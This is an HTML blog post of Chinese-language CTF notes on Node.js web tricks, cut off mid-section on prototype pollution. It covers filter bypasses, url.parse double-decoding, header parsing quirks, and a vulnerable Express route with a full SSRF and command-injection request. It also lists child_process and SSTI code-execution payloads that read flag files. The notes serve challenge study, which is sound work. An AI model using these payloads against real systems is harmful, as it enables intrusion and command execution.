@@ -1,0 +1,982 @@
+
+<!DOCTYPE html><html lang="zh-CN">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  
+  
+  <meta name="generator" content="Hexo 8.1.1">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>Node js - Zimo's Blogs</title>
+
+  
+    <meta name="description" content="Node js代码特性Function 1Function(&quot;console.log(&#x27;123455&#x27;);&quot;)() &#x2F;&#x2F;Function 函数传进函数要的内容返回的就是函数，再执行。  逗号的绕过nodejs 会把同名参数以数组的形式存储，并且 JSON.parse 可以正常解析。 12info&#x3D;&#123;&quot;username&quot;:&amp;quo">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Node js">
+<meta property="og:url" content="https://www.zimo.click/2026/01/02/Node_js/">
+<meta property="og:site_name" content="Zimo&#39;s Blogs">
+<meta property="og:description" content="Node js代码特性Function 1Function(&quot;console.log(&#x27;123455&#x27;);&quot;)() &#x2F;&#x2F;Function 函数传进函数要的内容返回的就是函数，再执行。  逗号的绕过nodejs 会把同名参数以数组的形式存储，并且 JSON.parse 可以正常解析。 12info&#x3D;&#123;&quot;username&quot;:&amp;quo">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zimo777.oss-cn-beijing.aliyuncs.com/b_be823baceb16d088783a325d9f8d71cb.jpg">
+<meta property="article:published_time" content="2026-01-02T04:26:45.000Z">
+<meta property="article:modified_time" content="2026-01-02T04:26:45.000Z">
+<meta property="article:author" content="Zimo">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://zimo777.oss-cn-beijing.aliyuncs.com/b_be823baceb16d088783a325d9f8d71cb.jpg">
+  
+  
+  
+  <meta name="keywords" content="CTF">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.33.1">
+
+
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Zimo","sameAs":[],"image":"https://zimo777.oss-cn-beijing.aliyuncs.com/b_be823baceb16d088783a325d9f8d71cb.jpg"},"dateCreated":"2026-01-02T12:26:45+08:00","dateModified":"2026-01-02T12:26:45+08:00","datePublished":"2026-01-02T12:26:45+08:00","description":"","headline":"Node js","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.zimo.click/2026/01/02/Node_js/"},"publisher":{"@type":"Organization","name":"Zimo","sameAs":[],"image":"https://zimo777.oss-cn-beijing.aliyuncs.com/b_be823baceb16d088783a325d9f8d71cb.jpg","logo":{"@type":"ImageObject","url":"https://zimo777.oss-cn-beijing.aliyuncs.com/b_be823baceb16d088783a325d9f8d71cb.jpg"}},"url":"https://www.zimo.click/2026/01/02/Node_js/","keywords":"CTF","image":[]}</script>
+  
+</head>
+<body>
+
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://zimo777.oss-cn-beijing.aliyuncs.com/b_be823baceb16d088783a325d9f8d71cb.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">Zimo's Blogs</div><div class="sub cap">Loading...</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="站内搜索"></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div>
+
+
+
+<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">最近更新</span></div><div class="widget-body fs14"><a class="item title" href="/2026/04/22/FastJson/"><span class="title">FastJson</span></a><a class="item title" href="/2026/04/08/%E5%86%85%E5%AD%98%E9%A9%AC/"><span class="title">Java内存马</span></a><a class="item title" href="/2026/04/04/ClassLoader/"><span class="title">ClassLoader</span></a><a class="item title" href="/2026/03/31/JAVA%E5%AE%89%E5%85%A8%E6%BC%AB%E8%B0%88/"><span class="title">Java安全漫谈学习笔记</span></a><a class="item title" href="/2026/03/29/CVE-2025-55182/"><span class="title">CVE-2025-55182</span></a><a class="item title" href="/2026/03/29/CAP/"><span class="title">CAP</span></a><a class="item title" href="/2026/03/29/Forgotten/"><span class="title">Forgotten</span></a><a class="item title" href="/2026/03/29/HTTP/"><span class="title">HTTP</span></a><a class="item title" href="/2026/03/29/LakeCTF25-26/"><span class="title">LakeCTF 25-26</span></a><a class="item title" href="/2026/03/29/LilacCTF-2026/"><span class="title">LilacCTF 2026</span></a></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/CTF/">CTF</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2026-01-02T04:26:45.000Z">2026-01-02</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2026-01-02T04:26:45.000Z">2026-01-02</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>Node js</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="Node-js"><a href="#Node-js" class="headerlink" title="Node js"></a>Node js</h1><h2 id="代码特性"><a href="#代码特性" class="headerlink" title="代码特性"></a>代码特性</h2><h3 id="Function"><a href="#Function" class="headerlink" title="Function"></a>Function</h3><p><img src="https://zimo777.oss-cn-beijing.aliyuncs.com/image-20250918151510427.png" alt="image-20250918151510427"></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Function</span>(<span class="string">&quot;console.log(&#x27;123455&#x27;);&quot;</span>)() <span class="comment">//Function 函数传进函数要的内容返回的就是函数，再执行。</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="逗号的绕过"><a href="#逗号的绕过" class="headerlink" title="逗号的绕过"></a>逗号的绕过</h3><p>nodejs 会把同名参数以数组的形式存储，并且 JSON.parse 可以正常解析。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">info=<span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;123456&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line">info=<span class="punctuation">&#123;</span><span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span>&amp;info=<span class="attr">&quot;password&quot;</span><span class="punctuation">:</span><span class="string">&quot;123456&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="大小写转化绕过"><a href="#大小写转化绕过" class="headerlink" title="大小写转化绕过"></a>大小写转化绕过</h3><p>对于<code>toUpperCase()</code>函数：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符<span class="string">&quot;ı&quot;</span>、<span class="string">&quot;ſ&quot;</span> 经过toUpperCase处理后结果为 <span class="string">&quot;I&quot;</span>、<span class="string">&quot;S&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>对于<code>toLowerCase</code>：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符<span class="string">&quot;K&quot;</span>经过toLowerCase处理后结果为<span class="string">&quot;k&quot;</span>(这个K不是K)</span><br></pre></td></tr></table></figure>
+
+<h3 id="replace-特性"><a href="#replace-特性" class="headerlink" title="replace 特性"></a>replace 特性</h3><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace#%E6%8C%87%E5%AE%9A%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%BD%9C%E4%B8%BA%E6%9B%BF%E6%8D%A2%E9%A1%B9">String.prototype.replace() - JavaScript | MDN</a></p>
+<h4 id="替换一次"><a href="#替换一次" class="headerlink" title="替换一次"></a>替换一次</h4><p><img src="https://zimo777.oss-cn-beijing.aliyuncs.com/image-20251016134558120.png" alt="image-20251016134558120"></p>
+<h4 id="特定字符替换"><a href="#特定字符替换" class="headerlink" title="特定字符替换"></a>特定字符替换</h4><p>例题：</p>
+<p><a target="_blank" rel="noopener" href="https://m1racle-7.github.io/2025/03/03/2025%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/">2025西湖论剑WP - “我不是二次元!”</a> </p>
+<p><a target="_blank" rel="noopener" href="https://z3r4y.blog.csdn.net/article/details/147400017">【Web】TGCTF 2025 题解_tgctfweb题解-CSDN博客</a></p>
+<p><img src="https://zimo777.oss-cn-beijing.aliyuncs.com/image-20251016134605962.png" alt="image-20251016134605962"></p>
+<p>绕过一【利用 js 特性替换加入引号恒等闭合】：</p>
+<p><img src="https://zimo777.oss-cn-beijing.aliyuncs.com/image-20251016134815152.png" alt="image-20251016134815152"></p>
+<p>绕过二【利用反斜杠进行联合查询】：</p>
+<p><img src="https://zimo777.oss-cn-beijing.aliyuncs.com/image-20251104104331496.png" alt="image-20251104104331496"></p>
+<h3 id="url-parse-特性"><a href="#url-parse-特性" class="headerlink" title="url.parse 特性"></a>url.parse 特性</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Jayjay___/article/details/140939637">网鼎杯 2020 半决赛]BabyJS-CSDN博客</a></p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 列出黑名单</span></span><br><span class="line"><span class="keyword">var</span> blacklist=[<span class="string">&#x27;127.0.0.1.xip.io&#x27;</span>,<span class="string">&#x27;::ffff:127.0.0.1&#x27;</span>,<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;0&#x27;</span>,<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="string">&#x27;[::1]&#x27;</span>,<span class="string">&#x27;::1&#x27;</span>];</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    res.<span class="title function_">json</span>(&#123;&#125;);</span><br><span class="line">&#125;);  <span class="comment">//页面返回的空页面</span></span><br><span class="line"></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/debug&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">ip</span>);  <span class="comment">// 记录请求的IP地址</span></span><br><span class="line">    <span class="keyword">if</span> (blacklist.<span class="title function_">indexOf</span>(req.<span class="property">ip</span>) != -<span class="number">1</span>) &#123;  <span class="comment">// 检查请求的IP是否在黑名单中</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;res&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> u = req.<span class="property">query</span>.<span class="property">url</span>.<span class="title function_">replace</span>(<span class="regexp">/[\&quot;\&#x27;]/ig</span>,<span class="string">&#x27;&#x27;</span>);  <span class="comment">// 获取请求中的URL参数，并去除其中的引号</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(url.<span class="title function_">parse</span>(u).<span class="property">href</span>);  <span class="comment">// 输出解析后的URL地址</span></span><br><span class="line">        <span class="keyword">let</span> log = <span class="string">`echo  &#x27;<span class="subst">$&#123;url.parse(u).href&#125;</span>&#x27;&gt;&gt;/tmp/log`</span>;  <span class="comment">// 构造一个命令，将URL写入日志文件</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(log);  <span class="comment">// 输出日志命令</span></span><br><span class="line">        child_process.<span class="title function_">exec</span>(log);  <span class="comment">// 执行日志命令，将URL写入日志文件</span></span><br><span class="line">        res.<span class="title function_">json</span>(&#123;<span class="attr">data</span>: fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;/tmp/log&#x27;</span>).<span class="title function_">toString</span>()&#125;);  <span class="comment">// 返回读取的日志文件内容作为JSON响应</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">json</span>(&#123;&#125;);  <span class="comment">// 如果IP不在黑名单中，返回空的JSON响应</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/debug&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>);  <span class="comment">// 记录POST请求的请求体内容</span></span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">url</span> !== <span class="literal">undefined</span>) &#123;  <span class="comment">// 如果请求体中包含URL参数</span></span><br><span class="line">        <span class="keyword">var</span> u = req.<span class="property">body</span>.<span class="property">url</span>;</span><br><span class="line">        <span class="keyword">var</span> urlObject = url.<span class="title function_">parse</span>(u);  <span class="comment">// 解析URL参数</span></span><br><span class="line">        <span class="keyword">if</span> (blacklist.<span class="title function_">indexOf</span>(urlObject.<span class="property">hostname</span>) == -<span class="number">1</span>) &#123;  <span class="comment">// 检查URL的主机名是否不在黑名单中</span></span><br><span class="line">            <span class="keyword">var</span> dest = urlObject.<span class="property">href</span>;  <span class="comment">// 获取完整的URL地址</span></span><br><span class="line">            <span class="title function_">request</span>(dest, <span class="function">(<span class="params">err, result, body</span>) =&gt;</span> &#123;  <span class="comment">// 发起对目标URL的请求</span></span><br><span class="line">                res.<span class="title function_">json</span>(body);  <span class="comment">// 返回目标URL的响应内容</span></span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">json</span>([]);  <span class="comment">// 如果URL在黑名单中，返回空数组作为响应</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>审计一下发现，get 请求的 debug 要求必须在本地，这样的话只能通过 post 请求来 SSRF，然后这里还对 ssrf 的 url进行黑名单检测，转个十进制绕过就好了。</p>
+<p>这里需要闭合单引号，但是引号被替换为空了这很难受。</p>
+<p>但是 <code>url.parse</code> 有个特性，</p>
+<p><img src="https://zimo777.oss-cn-beijing.aliyuncs.com/image-20251016142353802.png" alt="image-20251016142353802"></p>
+<p>意思是<code>@</code>前，也就是URL中表示用户名和密码的字段会被二次解码，所以可以构造如下payload即可闭合引号：</p>
+<p>%00 用作截断。</p>
+<p>payload：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/debug</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>ace028fb-9a40-44dd-9917-1503f096c14b.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=eyJhZG1pbiI6Im5vIn0=; session.sig=I_fZJGXMMi37C_Au3MEcBj5DfTo</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Priority</span><span class="punctuation">: </span>u=0, i</span><br><span class="line"><span class="attribute">Connect-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>85</span><br><span class="line"></span><br><span class="line"><span class="language-perl">&#123;<span class="string">&quot;url&quot;</span>:<span class="string">&quot;http://0177.0.0.1:3000/debug?url=http://a<span class="variable">%252</span>7<span class="variable">@a</span>;cp<span class="variable">$IFS</span>/flag<span class="variable">$IFS</span>/tmp/log<span class="variable">%00</span>&quot;</span>&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="HTTP解析方式"><a href="#HTTP解析方式" class="headerlink" title="HTTP解析方式"></a>HTTP解析方式</h3><h4 id="参数解析方式"><a href="#参数解析方式" class="headerlink" title="参数解析方式"></a>参数解析方式</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">req.<span class="property">body</span> =&gt; <span class="variable constant_">POST</span>/<span class="variable constant_">PUT</span>请求</span><br><span class="line"></span><br><span class="line">req.<span class="property">params</span> =&gt; 类似 /api/getUserListById/:id 路由，如 <span class="attr">http</span>:<span class="comment">//localhost:3000/giraffe/1</span></span><br><span class="line"></span><br><span class="line">req.<span class="property">query</span> =&gt; <span class="variable constant_">GET</span>请求，如 <span class="attr">http</span>:<span class="comment">//localhost:3000/animals?page=10</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="宽松的解析"><a href="#宽松的解析" class="headerlink" title="宽松的解析"></a>宽松的解析</h4><p>Node.js 作为一个 JavaScript 的运行环境，仅提供了一些基础的功能和 API，然而结合一些框架和第三方库能够完成很多丰富的应用。</p>
+<p>行符分割解析：NodeJS 会自动按<code>\n</code>分割 Header 内容，把换行后的结果当作独立字段处理</p>
+<p>宽松兼容机制：不严格遵循 HTTP RFC 的 “后续行需带 <code>SP/HT</code>” 要求，直接解析换行后的有效字段。</p>
+<p>自动忽略 header 键名（key）前后的空格<br>HTTP 协议规范里，header 的 key 是 “不允许含空格” 的，但实际开发中可能有不规范请求（比如误加空格）。NodeJS 为了兼容，会做 “<code>trim</code> 处理”—— 自动去掉 key 开头和结尾的空格。</p>
+<p>对 “相关键名” 的 value 进行合并<br>NodeJS 解析 header 时，会把 “语义相关” 的键名对应的 value 自动拼接（这里的 “相关” 本质是 NodeJS 对不规范键名的兼容处理，而非标准逻辑，但实际生效）</p>
+<p>也就是说在请求头中可以通过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xx:xx\nadmin:true</span><br></pre></td></tr></table></figure>
+
+<p>满足 Nodejs解析 admin&#x3D;true，但其他语言（PHP）不可以。</p>
+<h3 id="require-函数的妙用"><a href="#require-函数的妙用" class="headerlink" title="require 函数的妙用"></a><code>require</code> 函数的妙用</h3><p><a target="_blank" rel="noopener" href="https://siunam321.github.io/ctf/idekCTF-2025/web/scanme/">scanme - idekCTF 2025 Web 挑战赛题解 | siunam 的网站 — scanme - idekCTF 2025 Web Challenge Writeup | siunam’s Website</a></p>
+<p><img src="https://zimo777.oss-cn-beijing.aliyuncs.com/image-20251204213244316.png" alt="image-20251204213244316"></p>
+<p><code>require</code> 函数能解析一些 <code>nodejs</code> 代码格式的东西，类似于 include（只看文件内容，不看后缀名）。</p>
+<p><img src="https://zimo777.oss-cn-beijing.aliyuncs.com/image-20251204213345803.png" alt="image-20251204213345803"></p>
+<h3 id="parseInt妙用"><a href="#parseInt妙用" class="headerlink" title="parseInt妙用"></a><code>parseInt</code>妙用</h3><p><a target="_blank" rel="noopener" href="https://dmitripavlutin.com/parseint-mystery-javascript/">解决 JavaScript 中 parseInt() 的一个神秘行为 — Solving a Mystery Behavior of parseInt() in JavaScript</a></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">parseInt</span>(<span class="number">0.0000005</span>); <span class="comment">// =&gt; 5</span></span><br><span class="line"><span class="comment">// same as</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="number">5e-7</span>);      <span class="comment">// =&gt; 5</span></span><br><span class="line"><span class="comment">// same as</span></span><br><span class="line"><span class="built_in">parseInt</span>(<span class="string">&#x27;5e-7&#x27;</span>);    <span class="comment">// =&gt; 5</span></span><br></pre></td></tr></table></figure>
+
+<p>因为 <code>parseInt()</code> 总是将其第一个参数转换为字符串，所以小于 10 的浮点数 -6 以指数符号书写。然后 <code>parseInt()</code> 从浮点数的指数符号中提取整数。</p>
+<h3 id="Express解析参数上限"><a href="#Express解析参数上限" class="headerlink" title="Express解析参数上限"></a>Express解析参数上限</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/2402_88743313/article/details/154535955">攻防世界——ez_curl-CSDN博客</a></p>
+<p>express的parameterLimit默认为1000，即当参数个数大于1000时，后面的参数将被截断。</p>
+<h3 id="RCE-payload"><a href="#RCE-payload" class="headerlink" title="RCE payload"></a>RCE payload</h3><h4 id="纯代码执行"><a href="#纯代码执行" class="headerlink" title="纯代码执行"></a>纯代码执行</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">process.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;whoami&#x27;</span>);</span><br><span class="line">process.<span class="property">mainModule</span>.<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;/readflag&#x27;</span>).<span class="title function_">toString</span>();</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">spawnSync</span>( <span class="string">&#x27;cat&#x27;</span>, [ <span class="string">&#x27;fl00g.txt&#x27;</span> ] ).<span class="property">stdout</span>.<span class="title function_">toString</span>()</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)[<span class="string">&#x27;ex&#x27;</span>+<span class="string">&#x27;ecSync&#x27;</span>](<span class="string">&#x27;cat f*&#x27;</span>)</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;cat f*&#x27;</span>)</span><br><span class="line"><span class="variable language_">global</span>.<span class="property">process</span>.<span class="property">mainModule</span>.<span class="property">constructor</span>.<span class="title function_">_load</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">exec</span>(<span class="string">&#x27;calc&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h4 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readFileSync</span>(<span class="string">&#x27;fl001g.txt&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<h4 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&quot; &quot;</span>.<span class="property">toString</span>.<span class="title function_">constructor</span>(<span class="params"><span class="string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).execSync(&#x27;cat /flag&#x27;).toString()&quot;</span></span>)(<span class="params"></span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h2><p>Node.js 中的原型链（Prototype Chain）是JavaScript实现继承的一种机制。每个对象都有一个内部链接，指向另一个对象，这个对象被称为其原型。</p>
+<p>具体来说，原型链的工作原理如下：</p>
+<ol>
+<li>当访问一个对象的属性或方法时，首先在该对象自身中查找。</li>
+<li>如果找不到，就去其原型对象中查找。</li>
+<li>如果在原型对象中也找不到，就继续向上查找，直到找到为止或者到达<code>Object.prototype</code> 为止。</li>
+<li>如果在 <code>Object.prototype</code> 中也没有找到，则返回null。</li>
+</ol>
+<p>请注意：</p>
+<ul>
+<li><p><code>prototype</code>是一个静态属性，用于描述类或构造函数的行为和属性。eg.<code>xxx.prototype</code>。</p>
+</li>
+<li><p><code>__proto__</code>是一个动态属性，用于实际访问和修改对象的原型。eg.<code>a.__proto__</code>。</p>
+</li>
+</ul>
+<h3 id="原型链污染函数-merge-copy-clone"><a href="#原型链污染函数-merge-copy-clone" class="headerlink" title="原型链污染函数 merge&#x2F;copy&#x2F;clone"></a>原型链污染函数 merge&#x2F;copy&#x2F;clone</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (source.<span class="title function_">hasOwnProperty</span>(key)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">typeof</span> target[key] === <span class="string">&#x27;object&#x27;</span> &amp;&amp; <span class="keyword">typeof</span> source[key] === <span class="string">&#x27;object&#x27;</span>) &#123;</span><br><span class="line">                <span class="title function_">merge</span>(target[key], source[key]);</span><br><span class="line">            &#125; <span 